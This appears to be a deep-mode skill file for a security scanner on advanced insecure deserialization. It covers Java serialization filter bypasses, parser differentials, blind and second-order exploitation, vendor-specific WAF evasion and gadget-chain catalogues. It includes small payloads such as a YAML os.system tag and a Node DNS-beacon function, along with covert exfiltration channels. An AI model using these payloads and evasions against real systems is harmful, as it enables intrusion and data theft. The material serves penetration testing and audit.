---
name: insecure-deserialization-advanced-deep
description: Advanced insecure-deserialization depth — JEP 290/415 filter architecture and bypass classes, cross-format parser differentials, second-order and blind exploitation methodology, WAF magic-byte evasion, per-chain classpath preconditions across ysoserial / ysoserial.net / marshalsec / phpggc, and confirmation methodology when the sink cannot be probed by callback.
sibling: insecure_deserialization
load_when: scan_mode == "deep"
---

# Insecure Deserialization — Advanced Depth

This is the advanced+expert deep sibling to `insecure_deserialization.md`. The base owns the technique-class framing, per-language primitive tour, Sleeping Giants routing, and the confirmation-without-RCE ladder; the novel sibling `insecure_deserialization_novel_deep.md` owns the 2024–2026 published-instance frontier (jackson-databind CVE-2026-54512, XStream CVE-2024-47072, .NET 9 BinaryFormatter removal timeline, ML-pipeline PyTorch weights_only cluster, PyJWT September 2026 cluster, serialize-javascript prototype-poisoning cluster) with the canonical version/fix tables. This file owns the advanced-tier depth: filter architecture and bypass classes, format-parser differentials as an exploitation surface, second-order/blind exploitation methodology, WAF magic-byte evasion, per-chain classpath preconditions across the four canonical generators (ysoserial / ysoserial.net / marshalsec / phpggc), and the confirmation methodology when a callback is not available — all routed by filename.

## JEP 290 / JEP 415 Filter Architecture and Bypass Classes

The JDK's built-in deserialization defense has evolved in three stages, and each stage's bypass surface is different — reading the enforcement code is the load-bearing audit step.

**JEP 290 (JDK 9)** — introduces `ObjectInputFilter` with `Status {UNDECIDED, ALLOWED, REJECTED}` and a `FilterInfo` context carrying `serialClass()`, `arrayLength()`, `depth()`, `references()`, `streamBytes()`. The filter is a function `(FilterInfo) -> Status` consulted on every class encountered during graph reconstruction. Configuration is layered:
- **Process-wide default** via the `jdk.serialFilter` system property or the security property of the same name in `conf/security/java.security`.
- **Per-stream** via `ObjectInputStream.setObjectInputFilter(filter)`.
- **Global fallback** at `ObjectInputFilter.Config.setSerialFilter(filter)`.

The filter grammar allows glob patterns, negation (`!com.evil.*`), and depth/limit bounds (`maxarray=100;maxdepth=10;maxrefs=100;maxbytes=1000000`). A well-configured filter has a terminating `!*` reject; a filter that ends open (`java.util.*;javax.security.*;`) allows any class not explicitly enumerated, which is a false-safety pattern.

**JEP 415 (JDK 17)** — adds context-specific filter *factories*: `jdk.serialFilterFactory` system property or `ObjectInputFilter.Config.setSerialFilterFactory(BinaryOperator<ObjectInputFilter>)`. The factory receives the current filter and returns the next; the pattern lets a library install one factory that combines per-context filters (e.g., "servlet dispatch enforces the servlet-safe allow-list; internal RMI enforces a stricter one"). Absence of a factory = process-wide default only.

**Bypass classes when a filter is present**:

- **Allow-list-with-open-tail** — a filter like `java.util.*;javax.security.*;org.mycompany.dto.*` that omits the terminating `!*`. Any class not enumerated is allowed by default under the JEP 290 grammar's fall-through. Fix: append `!*` (reject everything not explicitly allowed).
- **Wildcard-in-package** — `com.mycompany.*` allows every class in the company's namespace, including `com.mycompany.internal.debug.RuntimeExecUtil` if it exists. The audit surface is every class in every allow-listed package; a single Serializable class with a magic method reaching `Runtime.exec` collapses the filter.
- **Chain-through-allowed-collection** — a gadget wrapped inside `java.util.HashMap` (allowed if `java.util.*` is on the list) can carry attacker-controlled objects into the graph. The filter is checked per-class as the graph is walked; a legitimate `HashMap` containing a gadget class is only caught if the gadget class itself is denied. Some filters check only the *outer* class per-stream.
- **Filter-not-installed-on-secondary-streams** — the app installs `ObjectInputFilter` on its main servlet dispatcher but leaves RMI, JMX, remote-EJB, and JMS ObjectMessage streams unfiltered. The internal-only surfaces are the primary bypass.
- **Depth/size limits missing** — a filter with `maxdepth=1000000;maxrefs=1000000` allows a "billion-laughs"-shape DoS even if class allow-listing is correct.
- **`setObjectInputFilter` called too late** — the filter is set *after* `readObject` has already been called; the guard is dead. Grep for the ordering.
- **Filter-factory replacement** — an attacker with a limited RCE (via a different bug) can call `ObjectInputFilter.Config.setSerialFilterFactory(x -> null)` at runtime and disable the process-wide filter. This is a post-exploitation persistence primitive, not an entry-primitive.

**Bypass classes when a filter is absent** — unbounded deserialization; the only limits are what the JVM's heap can hold. This is the default on unmigrated JDK 8 apps and on any JDK 9+ app whose deployment does not set the property. Grep the startup command for `-Djdk.serialFilter=` and the app's bootstrap for `setSerialFilter` / `setSerialFilterFactory`; absence of both is the finding.

**Detection greps for the filter posture**:
```
grep -r "ObjectInputFilter" src/                           # any use of the API
grep -r "setSerialFilter\|setSerialFilterFactory" src/     # explicit installation
grep -r "createFilter" src/                                # filter-construction call sites
grep -r "jdk.serialFilter" src/ conf/ resources/           # config-driven filter
ps -ef | grep java | grep -o -- '-Djdk\.serialFilter[^ ]*' # runtime filter args
```

**The Sleeping Giants interaction with filters** — a filter that allows `commons-collections:3.1` classes because those classes are used legitimately by the app is only safe as long as those classes remain gadget-free. If a dependency bump introduces a Sleeping Giants modification pattern (e.g., a new interface method on `LazyMap`), the previously-safe allow-listed class becomes chainable. Filter allow-lists must be re-audited on dependency bumps, not just per-major-release. Load `insecure_deserialization_novel_deep.md § Sleeping Giants` for the audit-cadence framing.

**Filter-enforcement audit walkthrough** — a repeatable methodology for confirming a filter's real posture rather than its documented one:

1. Read the JVM startup command from `/proc/<pid>/cmdline` or `jps -v`. Note whether `-Djdk.serialFilter=` or `-Djdk.serialFilterFactory=` is present. Absence: no process-wide filter; only per-stream and per-context can save you, and they have to be code-audited.
2. Read `<JAVA_HOME>/conf/security/java.security` for the property `jdk.serialFilter=`. Present: this is the process default; check whether the app's system-property override supersedes it (system property wins).
3. Grep the app's bootstrap classes for `ObjectInputFilter.Config.setSerialFilter` and `setSerialFilterFactory`. Each call is a distinct enforcement point; note the filter string and whether it terminates in `!*`.
4. Grep for `ObjectInputStream.setObjectInputFilter` — per-stream enforcement. This is the most reliable form when it exists; a stream created without this call is unfiltered even if a process default exists (unless the app relies on the default fallback, which many do).
5. Enumerate all `new ObjectInputStream(` construction sites; for each, confirm whether the returned stream has a filter installed *before* `readObject` is called. Ordering matters: a filter set after `readObject` is dead.
6. If the app uses a framework that wraps `ObjectInputStream` (Spring's `HttpInvokerServiceExporter`, Hessian's `HessianInput`, WebLogic's T3), the wrapping code may bypass the process default entirely. Framework-specific audit required.
7. Test the enforcement by submitting a payload with a class name known to be denied by the filter. A `ClassNotFoundException` in the response or logs proves the filter fired; a successful deserialization proves it did not.

**Filter-string bypass classes** — examples of filter strings that look protective but fail:
- `java.util.*;java.lang.*` — no `!*` terminator. Every class not enumerated is allowed by the fall-through.
- `!com.evil.*;*` — rejects the `com.evil.*` namespace and allows everything else. Any dangerous class outside `com.evil.*` passes.
- `com.mycompany.dto.*;com.mycompany.entity.*;!*` — allows only DTOs and entities. But if any of those DTOs has a `readResolve` reaching a dangerous sink, the filter passes it. The audit surface is the transitive closure of the allow-list, not the allow-list itself.
- `maxdepth=1000000` — depth limit set so high it does not defend against billion-laughs DoS.
- No `maxbytes` — a payload can be arbitrarily large, exhausting memory before the class filter matters.

**Filter-factory misuses** — a factory that returns `null` (interpreted as "no filter") disables filtering. A factory that returns an `ALLOWED`-only filter (`(fi) -> Status.ALLOWED`) allows everything. Both patterns appear in code that "temporarily" disables filtering for testing and forgets to re-enable.

**Enterprise-tier filter escapes** — WebLogic, WebSphere, JBoss/WildFly, and Weblogic-adjacent products each have their own serialization filter systems on top of JEP 290. Some are compliant with JEP 290; some pre-date it and use their own filter grammar. The Oracle CPU (Critical Patch Update) release notes catalog the version-boundary changes; if the target is on an enterprise app server, verify the app-server-level filter is enforced, not just the JVM-level one.

## Format-Parser Differentials

Cross-format smuggling is not a single vulnerability but a class of exploitation surface: a payload that parses safely under parser A and dangerously under parser B, or a payload where two parsers reach different structural conclusions and only one of those conclusions is what the security check inspected. The class expresses in every serialization ecosystem; the below are the confirmed instances worth writing against.

### BSON vs JSON

BSON's `code_w_scope` (major type `\x0F`) is a two-tuple: a JavaScript string plus a scope document. Historically, MongoDB drivers on the server side would evaluate the code when the wrapping accessor was called — the `$where` clause in a query was the canonical trigger. Modern drivers narrowed the surface, but the class shape remains: any middleware that content-sniffs "JSON" and passes the buffer to a driver that then interprets it as BSON opens the gap. A payload that lands as `{"$where": {"$code_w_scope": ["shell command via JS", {}]}}` after BSON parsing is invisible to a JSON-parsing WAF.

Differential test: submit the same payload as `Content-Type: application/json` and `Content-Type: application/bson`; observe whether the server response differs. If both are accepted and produce different behavior, you have a parser-mismatch surface.

### YAML vs JSON

The classical mismatch: a `%YAML 1.1` document containing `!!python/object/apply:os.system ['id']` parses as a mapping under a JSON-first schema check but as an executable class instantiation under YAML. Middleware that content-sniffs YAML from a `.yml` extension after a JSON schema-validate passes lands the payload at the YAML deserializer with attacker-controlled tags intact.

The subtler version: a document with no explicit tags but with YAML-specific type coercion (`yes`/`no`/`on`/`off` as booleans; unquoted numeric strings as ints; `1.2.3` as a version literal in some parsers). A JSON parser reads these as strings; a YAML parser reads them as typed values. Downstream code that treats a "boolean" field as authorization state can be flipped by an attacker submitting `is_admin: yes`.

### MessagePack strict vs loose

The ext-type mechanism (types `-128..127`) is user-extensible; a `fixext_1` with type `0x63` has been used as a hidden pickle-in-msgpack channel by libraries that register a "pickle" ext-type handler on the receiver. Detection: enumerate the ext-type handlers a receiver registers (grep for `register_ext_type` / `packer.register_ext_type` in Python, `RegisterExtension` in C#, `ExtensionCodec` in Java `msgpack-jackson`). Any handler that maps to `pickle.loads` / `Deserializer.Deserialize` / `ObjectInputStream.readObject` is a covert deserialization sink.

Strict-vs-loose mode differs by library. `msgpack-python`'s `use_bin_type=False` (deprecated but still on many stacks) parses raw bytes as strings, changing type dispatch downstream. `msgpack-java`'s `MessagePackFactory.setBinaryLimit(int)` gates DoS; absent, unbounded.

### CBOR tag handlers

RFC 8949 defines CBOR tags via major type 6 with tag numbers `0..2^64-1`. Tags are decoder-callback hooks: a decoder that registers a handler for a specific tag executes the handler when the tag is encountered on the wire. `ciborium` in Rust and `cbor2` in Python both support the tag-hook API.

Attack shape: a service that registers a "pickle" tag handler (or accepts a user-supplied tag registration) has the CBOR analog of pickle's `__reduce__`. Confirm by fuzzing the target with CBOR streams carrying uncommon tag numbers and observing whether any produce parser-callback stack traces or unexpected behaviour. The `dr-yasser-tag` demonstration in the CBOR test suite is a benign probe for handler enumeration.

### ASN.1 / DER parser confusion

Parser confusion between OpenSSL / mbedTLS / .NET / Python `pyasn1` on optional/default fields lands in TLS handshakes, certificate chains, and PKCS#12 / PKCS#7 blobs. A signed structure that one parser interprets as an integer and another as a wrapped OCTET STRING opens a signature-verification bypass surface. The historical exemplars are the ROCA-adjacent misparse and the more recent BoringSSL vs OpenSSL DN normalization gaps.

Test methodology: build a certificate or signed structure with a field that both `pyasn1` and OpenSSL accept but reach different semantic values on; submit to the app's verification path; observe whether the app's decision differs from an independent verification with a second parser.

### Protobuf reflection with `google.protobuf.Any`

A decoder that trusts a `type_url` field to select a message type is picking a class name from attacker data. If the type registry maps to a class with a downstream sink, the pattern echoes Jackson polymorphic typing in a protobuf wrapper. Common in service-mesh / gRPC-gateway architectures where the outer protobuf is a generic envelope.

Detection: grep the `.proto` files for `google.protobuf.Any` fields, then trace how the receiving service resolves the type URL to a class. If the resolution goes through a reflection-based factory (Go's `proto.MessageType`, Java's `Any.unpack`, Python's `Any.Unpack`), the class shape is live.

### JWT vs raw signed cookies

Some libraries have "compatibility" code that treats a signed cookie as a JWT if it happens to match the JWT format. A payload that both a JWT parser and a cookie parser accept but disagree on the claims layout produces a claim-set mismatch — the verifier checks one set of claims, the app reads a different one from the same bytes. Rare but real; grep for cookie/JWT combined-parsing helpers.

### URL-encoded serialized data through a WAF

Not a parser differential per se but a WAF-differential: some WAFs decode `%XX` sequences once, some twice; a payload double-encoded past the WAF single-decode reaches a sink that decodes twice. This is the class shape behind many "polyglot-in-URL" bypasses. The measured matrix for the top WAFs lives in `waf.md` if a general handling is needed; this file owns only the deserialization-adjacent expression.

### Cross-format polyglot construction

The offensive shape: a payload that is simultaneously valid across two formats but semantically different. Concrete constructions:

- **JSON-in-YAML polyglot** — YAML is a superset of JSON, so a valid JSON document is a valid YAML document. Injecting a YAML tag inside a JSON-shaped structure (`{"key": !!python/object/apply:os.system ["id"] "value"}`) is technically malformed JSON but many YAML parsers accept it in a lax mode. A middleware that "validates JSON" then passes the same bytes to a YAML parser lands the tag.
- **Java-native + MessagePack polyglot** — the Java native serialization stream starts with `AC ED 00 05`; if the receiving MessagePack parser treats leading bytes it does not understand as a "raw" or "extension" prefix (unlikely for well-implemented parsers but possible for custom ones), the Java bytes ride along.
- **PHP-serialize + JSON polyglot** — a PHP-serialized string can contain characters that a JSON parser interprets as valid tokens. The classical construction is `O:8:"stdClass":1:{s:1:"a";s:1:"b";}` which is valid PHP-serialize; embedding it inside a JSON string escapes the JSON parse but the trailing bytes reach the PHP deserializer.
- **Base64-encoded-Java in a JSON string** — the outer JSON is valid; the inner base64 decodes to a Java native serialization stream; the app's downstream handler base64-decodes and calls `ObjectInputStream.readObject()`. WAFs matching on the raw Java magic bytes miss this.
- **JSON with a duplicate key** — `{"@type": "safe.Class", "@type": "com.evil.Gadget"}`. RFC 8259 says duplicate keys are "unpredictable"; different parsers pick different values. If the WAF's parser picks the first value and the deserializer picks the last, the WAF thinks the type is safe while the deserializer instantiates the gadget.

### Content-type sniffing as a parser-differential

Middleware that sniffs content-type from the body prefix (looking for `{` to mean JSON, `<` to mean XML, `%YAML` to mean YAML) can be steered to route a payload to the wrong parser. A body that starts with `{"a":1}` sniffs as JSON but continues with a YAML document; the JSON-first check reads the JSON prefix, the YAML-eventual parser reads the whole body. This is content-type confusion applied at the parser-selection layer.

### Time-of-check vs time-of-use (TOCTOU) on deserialization

The classical TOCTOU shape at the format layer: a WAF snapshots the payload, decodes and validates it, then passes the original (un-validated) bytes to the app. If the app decodes differently (case sensitivity, whitespace handling, comment stripping), the validated form and the executed form differ. The mitigation is "validate the exact bytes the app will parse" — pass the WAF-canonicalized form downstream, not the original. Most WAFs pass the original.

## Second-Order and Blob-Bypass Exploitation

Second-order deserialization is when the payload is stored by one endpoint and unmarshaled by another, later, in a different context. The write path passes checks the read path does not have; the deserialize action fires on the read path with attacker data already in-place.

**Attack-graph model for second-order**:
1. **Write endpoint** — accepts attacker input, stores it. May validate as a string / JSON / opaque blob and pass a WAF/schema check because the data is not being deserialized here.
2. **Storage medium** — database column, cache entry, filesystem file, session store, message queue, log line. The storage medium may itself deserialize (a cache that unmarshals on read is the primary chain).
3. **Read endpoint** — a different endpoint (often admin-tier or background-job) reads the stored data and unmarshals. This is where the sink is.
4. **Trigger** — the read may be lazy (only fires when an admin logs in or a scheduled job runs); the payload dwell time can be days.

The class is durable because the write endpoint's schema check does not know what the read endpoint will do with the data. A username field that accepts `<script>` and reflects it in the profile view is XSS; the same field accepting a base64-encoded pickle blob that a monthly-report generator unmarshals is deserialization.

**High-yield write paths**:
- **Profile fields** — display name, bio, address, tags, custom-user-attributes.
- **File names and file metadata** — uploaded filename shown in an admin file browser; EXIF fields on images consumed by a thumbnail generator.
- **Support-ticket bodies and internal-comment fields** — rendered in a support-agent UI that unmarshals structured attachments.
- **Log-line-injectable fields** — `User-Agent`, `Referer`, `X-Forwarded-For`, custom headers that a log pipeline reconstructs as typed events.
- **Cache-write primitives** — any endpoint that populates a cache the app later reads. Combined with cache-poisoning (`cache_poisoning.md`), the write is unauthenticated.
- **Import/export endpoints** — CSV/JSON/YAML imports that reconstruct database rows via typed serializers on the way in.
- **Job-queue writes** — Celery, Sidekiq, Bull, Kafka producer with a Java-serialized value.

**High-yield read paths (where the sink fires)**:
- Admin dashboards iterating all users and rendering profile data through a template that deserializes cached views.
- Report generators (weekly/monthly) that walk the database and construct structured summaries with typed serializers.
- Background workers that consume queues (any pickled-args worker).
- Log viewers / SIEM query pipelines that re-parse stored events.
- Cache-warm scripts that unmarshal every entry to pre-populate application state.
- Session-load handlers on every request when the session store is Marshal/pickle-backed.

**Confirmation methodology for blind second-order sinks**:
1. **Attribution beacon in the payload** — a callback URL that encodes the write-time context: `_$$ND_FUNC$$_function(){require('dns').lookup('write-endpoint-' + <fieldname> + '.<oast>')}()`. When the beacon fires, its DNS name tells you which write endpoint and field the payload came from.
2. **Time-window probing** — trigger the suspected read endpoint (log in as admin, run the report manually, force a cache warm) after writing the payload, and observe callback timing. A callback exactly correlated with the trigger action confirms the read path.
3. **Long-lived probes** — a callback that lands hours or days after the write proves a delayed-trigger sink (a scheduled report, an overnight batch job). Keep the OAST host live long enough; a 24-hour TTL is standard.

**Blob-bypass exploitation** — even when the write endpoint validates strictly (schema, allow-listed characters, size limit), the storage layer can transform the data such that the read endpoint sees a different blob:
- **Charset normalization mismatch** — UTF-8 vs UTF-16 vs UTF-7. A payload accepted as "ASCII" that gets normalized to UTF-16 at read time may lose or gain bytes.
- **Length prefixes vs delimiters** — a database column stored as `varchar(1024)` truncates at 1024 bytes; a payload crafted to produce a specific truncation point produces a different deserialization result.
- **Compression at rest** — a database that transparently compresses BLOB columns may decompress with a slightly different algorithm on read; edge cases in the compression codec can be attack surface.
- **JSON re-serialization at rest** — a document store that stores JSON in its own internal format re-serializes on read; a JSON payload with duplicate keys, non-canonical escapes, or numeric precision at the edge of `Number.MAX_SAFE_INTEGER` may round-trip differently.

**Blind exploitation ladder** — when the sink cannot be probed by a direct callback (network-egress-blocked target, sink on a background worker on a separate network segment), the ladder becomes:
1. **In-payload error probing** — a malformed length prefix that would only be caught by the deserializer itself. If the app logs a class-name exception matching the format anywhere in its logs (support-ticket "your request failed" email; admin log-viewer error), the sink is live.
2. **Timing side-channels** — a payload that sleeps N seconds when deserialized. Measure the response boundary of the trigger action.
3. **Storage-side effects** — a payload that when deserialized, writes to a database column or a cache key that a subsequent unauthenticated request can read. This is the "storage as covert channel" pattern.
4. **DNS beacon via alternate egress** — if the app can send email (SMTP) or make outbound HTTPS to a specific allow-listed host, a gadget that reaches the mail sender or the outbound HTTP client with an attacker-controlled URL parameter completes the callback.

Load the base `insecure_deserialization.md § Chaining` for the routing catalog into cache_poisoning, information_disclosure, and file_upload for the composite second-order chains.

## Blind Deserialization Methodology

When the sink is real but no callback lands and no error surfaces, the exploitation methodology has to be inferential. The workflow:

1. **Prove the sink is running** — an in-graph error probe (a malformed magic byte or length prefix that a deserializer would catch and no upstream WAF would). If the app returns a 500 with a class-name in the trace, the deserializer ran. If the app returns a 200 with unchanged behavior, the sink may not exist here.
2. **Enumerate the classpath without RCE** — a payload that references a specific class and observes whether the response changes. Try `com.sun.rowset.JdbcRowSetImpl` (present in every JDK), then framework-specific classes (`org.springframework.context.support.ClassPathXmlApplicationContext`, `org.hibernate.persister.entity.SingleTableEntityPersister`). A response that varies by class name (different error, different timing) is a classpath oracle.
3. **Timing-driven confirmation** — a gadget that sleeps 5 / 10 / 30 seconds based on a chosen boolean. The response time reveals whether the branch was taken.
4. **Out-of-band via alternate egress** — if the target's egress policy blocks direct outbound but allows DNS-through-corporate-resolver, a gadget performing a DNS resolution reaches OAST. Some enterprises rate-limit direct HTTP but allow SMTP; a gadget triggering a mail send with an attacker-controlled subject can leak data through the mail body if the mail server is externally reachable.
5. **Storage covert channel** — a gadget that writes a value to a public-readable location (a filesystem path served by the app, a cache key with an unauthenticated read endpoint). The value can carry command output, environment strings, or any exfiltrated data.
6. **Cross-request side-channel** — a gadget that modifies process-wide state (a static field, a system property, a cached configuration). A subsequent unauthenticated request reads the state.

**When the target is genuinely air-gapped from any external network**, the finding is still real but the impact framing shifts from "RCE with data exfiltration" to "code execution within the tenant boundary." Document as such; do not claim exfiltration you cannot demonstrate.

**Detection of no-egress environments** — an OAST probe that gets no response is not diagnostic on its own (the sink may not exist, or the egress may be blocked). Distinguish by trying multiple OAST providers (`interactsh`, `dnslog`, custom PTR resolver), and by comparing the in-graph error probe results: if the error probe succeeds (sink is live) but no callback lands (egress is blocked), the situation is clear.

**Side-channel confirmation catalog** — concrete techniques ranked by reliability:

- **HTTP response timing** — a gadget that sleeps N seconds. The response boundary of the HTTP request shifts by N seconds. Measure with a stopwatch or `curl -w '%{time_total}'`. Reliable when the target has predictable baseline latency.
- **Database write** — a gadget that writes a canary value to a database row the attacker can later read (via a legitimate query endpoint). Requires knowing the DB schema and having read access; suitable for authenticated targets.
- **Filesystem write** — a gadget that writes to a public-served path (`/uploads/`, `/tmp/webroot/`). Fetch the file to confirm; the file contents can carry command output.
- **Log line injection** — a gadget that writes to a log the attacker can read (support-ticket "your request failed" email; admin log-viewer).
- **Cache-key write** — a gadget that writes to a Redis/Memcached key that a subsequent unauthenticated request reads (via a public-accessible cache-lookup endpoint).
- **Session-field modification** — a gadget that modifies the current session's fields (`is_admin=true`). Test by observing whether subsequent requests reflect the modification.
- **HTTP-response header manipulation** — a gadget that adds a header to the current response. Observable in the response headers directly.
- **Error-page control** — a gadget that raises a specific class of exception that the app's error handler catches and displays. The specific exception message is the covert channel.

**Response-timing measurement pitfalls**:
- Baseline the target under normal load first; a target with jitter of ±3 seconds cannot reliably confirm a 5-second sleep.
- Run multiple probes and take the median; a single measurement is noise.
- Test with progressively longer sleeps (1s, 5s, 10s, 30s); a linear response to the sleep parameter confirms the sink.
- Beware app-level caching that returns cached responses without invoking the sink; parameterize the payload to bypass cache.

## WAF/Filter Bypass Classes for Magic Bytes

WAFs that inspect deserialization traffic typically match on magic-byte prefixes: `AC ED 00 05` for Java, `TypeNameHandling` string for .NET JSON, `!!python/` for YAML, `_$$ND_FUNC$$_` for Node. Bypass classes exploit the difference between what the WAF matches on and what the deserializer accepts.

**Encoding-layer bypass** — the WAF decodes one encoding layer (base64), the app decodes two (base64 + gzip). A double-encoded payload passes the WAF's single-layer match against the un-gzipped magic bytes.

**Fragmentation** — the WAF matches on a whole-body substring; the app processes chunked HTTP or WebSocket message-fragments and reassembles before deserialization. A payload split across chunk boundaries such that no chunk contains the full magic-byte prefix bypasses the WAF.

**Content-type spoofing** — the WAF only inspects `application/x-java-serialized-object` bodies; the app dispatches based on the URL and accepts the same bytes as `application/octet-stream` or even `text/plain`.

**Header-vs-body attack** — the sink accepts the serialized blob in a header value or a Cookie; the WAF only inspects the body. Common on ASP.NET where `__VIEWSTATE` can arrive in a header on some configurations.

**Case-sensitivity mismatch on markers** — the WAF matches on `_$$ND_FUNC$$_` case-sensitively; the deserializer accepts case-insensitive marker matching in some forks. This is library-version-specific and worth checking.

**Rewriting the magic bytes** — some formats accept multiple valid header representations. Java native has `AC ED 00 05` (protocol 5) but historically also `AC ED 00 04`; some readers accept both. A WAF rule matching only the current version misses the historical one.

**Length-based evasion** — the WAF has a size limit on inspection (top 1 KB, top 8 KB). A payload padded with legitimate-looking prefix bytes (a large JSON object, a benign wrapper) that positions the actual serialized blob past the inspection limit bypasses.

**Structural-vs-string matching** — the WAF matches on the string `TypeNameHandling` case-insensitively; the payload uses Unicode escapes (`TypeNameHandling`) that the JSON parser decodes but the WAF's substring match misses.

**Content-encoding gzip** — a request with `Content-Encoding: gzip` and a compressed body; the WAF may either not decode gzip or may size-limit decompression. In both cases the compressed payload evades string matching.

**Base64 alphabet variants** — standard `[A-Za-z0-9+/=]` vs URL-safe `[A-Za-z0-9_-=]` vs padded/unpadded. A WAF rule matching only the standard alphabet misses URL-safe variants that Java `Base64.getUrlDecoder()` and .NET `WebEncoders.Base64UrlDecode` accept.

**The measured WAF-bypass matrix** — for a specific WAF product plus a specific serialization format, some of the above work and some do not. The definitive test is: build the payload, submit it, capture the WAF verdict and the app response, iterate. The `waf.md § Serialization-Specific Rulesets` documents the top-5 commercial WAFs' current serialization-inspection defaults; use it as the starting point but confirm against the target because customer rulesets are heavily customized.

**Per-product WAF-signature evasion catalogue**:

- **ModSecurity + OWASP CRS** — rules on serialization typically match on regex; a payload with case-mixed magic-byte hex (`Ac Ed 00 05`) or with intervening whitespace (Java stream fields with embedded spaces in the class name via specific opcode manipulation) evades. CRS has a rule for `TypeNameHandling` case-insensitive but is regex-based on the JSON key form.
- **AWS WAF** — the "AWS Managed Rules — Known bad inputs" set includes serialization-attack rules; the `SizeConstraint` action limits body inspection. Payloads larger than the inspection size bypass; also the `BodyContainsCondition` operates on raw bytes and misses gzip-encoded payloads unless `ContentTransformation: URL_DECODE` is also configured.
- **Cloudflare WAF** — Managed Rules include serialization-attack rules; case-insensitive matching on the `.NET TypeNameHandling` marker. Bypass via Unicode-escape encoding within JSON strings.
- **Akamai Kona** — signature-based; case-mixed variants of the magic byte pattern bypass many rules. Multi-layer encoding (base64 + gzip + rot13) evades.
- **F5 ASM/BIG-IP** — its "Java serialization exploit" attack signature matches `AC ED 00 05` prefix. Byte-level padding before the prefix (unless the padding is inspected as a valid HTTP-content-encoding) evades.
- **Imperva** — similar signature-based approach; the Imperva-specific bypass class is content-type based routing — a `text/plain` body with the same serialized bytes bypasses `application/json`-scoped rules.

**Rule-shape enumeration** — for a target with an unknown WAF, submit progressively-malformed variants of the payload and observe which are blocked:
1. Full payload → blocked?
2. Payload with a random 4-byte prefix → blocked?
3. Payload gzip-encoded → blocked?
4. Payload double-base64-encoded → blocked?
5. Payload in a `text/plain` body → blocked?
6. Payload in a header value → blocked?

The pattern of block/allow responses fingerprints the WAF ruleset. This is not a "bypass" per se but the enumeration step before selecting a bypass.

**Time-based bypass** — WAFs with expensive inspection sometimes disable inspection under load; a payload delivered during a traffic spike may pass. Not reliable, but observed in some enterprise deployments.

**Cache-based bypass** — a WAF that caches inspection results per source IP + URI may honor the cached "safe" verdict when the payload was previously seen as benign. First submit a benign payload matching the URI shape; then submit the attack payload from the same source.

## Gadget-Chain Catalogue Framing

The four canonical generators (ysoserial, ysoserial.net, marshalsec, phpggc) each cover a different ecosystem; the catalog is what makes deserialization exploitation reproducible.

### ysoserial (Java native, frohoff)

34 named chains — full roster: AspectJWeaver, BeanShell1, C3P0, Click1, Clojure, CommonsBeanutils1, CommonsCollections1, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6, CommonsCollections7, FileUpload1, Groovy1, Hibernate1, Hibernate2, JBossInterceptors1, JRMPClient, JRMPListener, JSON1, JavassistWeld1, Jdk7u21, Jython1, MozillaRhino1, MozillaRhino2, Myfaces1, Myfaces2, ROME, Spring1, Spring2, URLDNS, Vaadin1, Wicket1.

**Per-chain library preconditions** (fingerprint the target's classpath and pick the smallest chain that fires):
- **URLDNS** — JDK only; safe DNS probe. Always start here.
- **CommonsCollections1** — `commons-collections:3.1`; targets JDK 6/7/8 with the pre-Java-8u75 `AnnotationInvocationHandler` invariant.
- **CommonsCollections2** — `commons-collections:4.0`. Post-8u76 target.
- **CommonsCollections3** — `commons-collections:3.1`; works around some `AnnotationInvocationHandler` blocks.
- **CommonsCollections4** — `commons-collections:4.0`. The CC4-4.0 chain, distinct from CC2.
- **CommonsCollections5, CommonsCollections6** — `commons-collections:3.1`; used when CC1 fails due to `Runtime` block or when a lighter chain is needed.
- **CommonsCollections7** — `commons-collections:3.1`; newer discovery, wraps different invariants.
- **CommonsBeanutils1** — `commons-beanutils:1.9.2` plus `commons-collections`; useful when CC-only chains fail.
- **Spring1, Spring2** — Spring 4.x; targets Spring's own reflection helpers (`org.springframework.beans.factory.ObjectFactory`).
- **Groovy1** — Groovy runtime (`groovy-all:2.3.9`); reaches `MethodClosure`.
- **Hibernate1, Hibernate2** — Hibernate ORM 4.x on classpath; useful in ORM-heavy stacks.
- **ROME** — `rome:1.0`; often present in RSS-consuming apps.
- **Click1** — Apache Click 2.3.0; niche but real on Click-based apps.
- **Clojure** — Clojure 1.8.0; reaches via `clojure.core$binding_conveyor_fn`.
- **JBossInterceptors1, JavassistWeld1** — JBoss/Weld runtime; common in Java-EE deployments.
- **JRMPClient / JRMPListener** — no library requirement; JRMP-shape payload that reaches back to a listener the attacker runs (attacker-controlled server on the return path).
- **JSON1** — `json-lib:2.4`; the JSON-library-specific chain.
- **Jdk7u21** — JDK 7 update 21 or older; sun.reflect internals bug.
- **Jython1** — Jython 2.5.2; targets embedded Jython.
- **MozillaRhino1, MozillaRhino2** — Rhino JavaScript engine; the internal `NativeError` chain.
- **Myfaces1, Myfaces2** — MyFaces JSF 2.x; JSF-specific.
- **Vaadin1** — Vaadin framework 7.x.
- **Wicket1** — Apache Wicket 1.4/1.5.
- **AspectJWeaver** — AspectJ 1.9; targets `SimpleCache$StoreableCachingMap`.
- **FileUpload1** — Commons FileUpload; older versions.

Load `insecure_deserialization_novel_deep.md § ysoserial Chain Roster — Detailed Preconditions` for the exact library-version tuple and the reachability graph per chain, plus the ICSE'25 trampoline-gadget analysis of which chains use trampoline gadgets (the softened 22/34 finding — do not restate the class-abstraction superlative refuted at Batch 3 §0).

### ysoserial.net (pwntester)

Gadget/target-formatter matrix — the primary gadgets and which formatters each reaches:
- **ObjectDataProvider** — reaches 11 sinks: BinaryFormatter, DataContractSerializer, FastJson, FsPickler, JavaScriptSerializer, Json.NET, MessagePackTypeless, SharpSerializerBinary, SharpSerializerXml, Xaml, XmlSerializer, YamlDotNet. The near-universal .NET gadget.
- **TextFormattingRunProperties** — reaches BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter. The ViewState-preferred gadget.
- **WindowsIdentity** — reaches BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter. Uses `System.Security.Principal.WindowsIdentity`.
- **WindowsPrincipal, RolePrincipal, SessionSecurityToken** — reach the same formatter set as WindowsIdentity; use when WindowsIdentity is blocked or when a different type-graph shape is needed.
- **TypeConfuseDelegate** — the classic .NET Framework gadget for BinaryFormatter; wraps a `Comparer<T>` type-confusion.
- **PSObject** — PowerShell PSObject; reaches BinaryFormatter/LosFormatter/ObjectStateFormatter for the ViewState path.

